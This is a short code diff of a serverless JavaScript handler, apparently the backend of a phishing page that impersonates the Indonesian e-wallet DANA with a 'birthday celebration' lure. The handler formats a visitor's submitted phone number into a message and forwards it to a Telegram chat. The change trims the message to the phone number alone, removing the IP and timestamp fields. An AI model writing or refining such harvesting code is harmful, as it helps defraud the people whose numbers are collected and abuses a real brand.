@@ -55,13 +55,10 @@ exports.handler = async (event, context) => {
             };
         }
         
-        // Format pesan untuk Telegram
+        // Format pesan untuk Telegram - HANYA NOMOR HP
         const formattedMessage = `┌─ 📱 DANA - Hajatan Ulang Tahun
 ├───────────────────
 ├─ 🔢 NOMOR HP : ${phone}
-├─ 🌐 IP : ${ip || 'Unknown'}
-├─ 📅 WAKTU : ${timestamp || new Date().toLocaleString('id-ID')}
-├─ 🎯 STATUS : New Registration
 ╰───────────────────`;
         
         // Kirim ke Telegram API
@@ -89,7 +86,7 @@ exports.handler = async (event, context) => {
                 body: JSON.stringify({ 
                     success: true, 
                     message: 'Data berhasil dikirim ke Telegram',
-                    data: { phone, timestamp, ip }
+                    data: { phone }
                 })
             };
         } else {
